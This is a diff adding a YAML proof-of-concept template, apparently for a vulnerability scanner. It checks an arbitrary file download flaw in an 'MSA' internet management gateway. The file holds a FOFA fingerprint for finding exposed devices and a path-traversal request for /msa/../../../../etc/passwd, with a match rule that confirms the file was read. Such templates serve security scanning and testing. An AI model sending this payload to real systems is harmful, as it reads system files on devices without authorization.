@@ -1,0 +1,15 @@
+id: poc-yaml-msa-internet-management-gateway-msa-anyfile-read
+info:
+  name: MSA 互联网管理网关 msa 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: MSA 互联网管理网关
+  fofa: header="Server\x3a MSA"
+requests:
+- method: GET
+  path: /msa/../../../../etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
